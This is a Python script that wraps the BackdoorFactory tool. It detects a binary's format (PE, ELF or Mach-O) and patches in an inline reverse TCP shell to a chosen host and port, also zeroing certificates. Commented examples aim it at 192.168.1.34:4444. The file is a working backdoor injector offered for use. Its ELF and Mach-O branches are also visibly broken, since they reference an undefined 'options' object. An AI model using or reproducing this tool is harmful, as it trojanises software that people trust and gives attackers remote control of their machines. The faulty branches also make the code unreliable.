#!/usr/bin/env python
'''
BackdoorFactory (BDF) v3 - FOUNTAINPATCH

Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
Without him, I would still be trying to do stupid things
with the elf format.

Also thanks to Silvio Cesare with his 1998 paper
(http://vxheaven.org/lib/vsc01.html) which these ELF patching
techniques are based on.

Special thanks to Travis Morrow for poking holes in my ideas.

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

	1. Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

	2. Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation
	and/or other materials provided with the distribution.

	3. Neither the name of the copyright holder nor the names of its contributors
	may be used to endorse or promote products derived from this software without
	specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

from os.path import basename
from os import getcwd
from pebin import pebin
from elfbin import elfbin
from machobin import machobin





class start(object):
    def __init__(self, choice, FILE, HOST, PORT):
        self.choice = choice
        self.FILE = FILE
        self.HOST = HOST
        self.PORT = PORT

        if self.basicDiscovery(self.FILE) != choice:
            self.conflict() 


    @staticmethod
    def conflict():
        return "Your file conflict with your choice."

    @staticmethod
    def basicDiscovery( FILE):
        macho_supported = ['\xcf\xfa\xed\xfe', '\xca\xfe\xba\xbe','\xce\xfa\xed\xfe']
        testBinary = open(FILE, 'rb')
        header = testBinary.read(4)
        testBinary.close()
        if 'MZ' in header:
            return 'PE'
        elif 'ELF' in header:
            return 'ELF'
        elif header in macho_supported:
            return "MACHO"
        else:
            'Only support ELF, PE, and MACH-O file formats'
            return None


    def patch(self):
        if self.choice is "PE":
            supported_file = pebin(self.FILE,  					#options.FILE
                                   None,						#options.OUTPUT
                                   "reverse_shell_tcp_inline",	#options.SHELL
                                   "sdata",						#options.NSECTION
                                   0,							#options.DISK_OFFSET
                                   False,						#options.ADD_SECTION
                                   False,						#options.CAVE_JUMPING
                                   self.PORT,					#options.PORT
                                   self.HOST,					#options.HOST
                                   None,						#options.SUPPLIED_SHELLCODE
                                   False,						#options.INJECTOR
                                   True,						#options.CHANGE_ACCESS
                                   False,						#options.VERBOSE
                                   False,						#options.SUPPORT_CHECK
                                   380,							#options.SHELL_LEN
                                   False,						#options.FIND_CAVES
                                   ".old",						#options.SUFFIX
                                   False,						#options.DELETE_ORIGINAL
                                   False,						#options.CAVE_MINER
                                   "ALL",						#options.IMAGE_TYPE
                                   True,						#options.ZERO_CERT
                                   False,						#options.RUNAS_ADMIN
                                   True,						#options.PATCH_DLL
                                   "automatic",					#options.PATCH_METHOD
                                   None,						#options.SUPPLIED_BINARY
                                   False,						#options.XP_MODE
                                   False,						#options.IDT_IN_CAVE
                                   False,						#options.CODE_SIGN
                                   )

        elif self.choice is "ELF":
            supported_file = elfbin(self.FILE,
                                    None,
                                    "REVERSESHELLNAME",
                                    self.HOST,
                                    self.PORT,
                                    False,
                                    False,
                                    options.SHELL_LEN, #I must learn this
                                    None,
                                    "ALL"
                                    )

        elif self.choice is "MACHO":
            supported_file = machobin(self.FILE,
                                      None,
                                      "REVERSESHELLNAME",
                                      self.HOST,
                                      self.PORT,
                                      False,
                                      None,
                                      options.FAT_PRIORITY, #Special settings for macho files
                                      options.BEACON
                                      )


        print ("\n\n")
        result = supported_file.run_this()
        print ("File {0} created !\n\n".format(supported_file.OUTPUT))



#start("PE", "Handle.exe", "192.168.1.34", 4444).patch()
#start("ELF", "Handle.exe", "192.168.1.34", "4444").patch()
#start("MACHO", "Handle.exe", "192.168.1.34", "4444").patch()
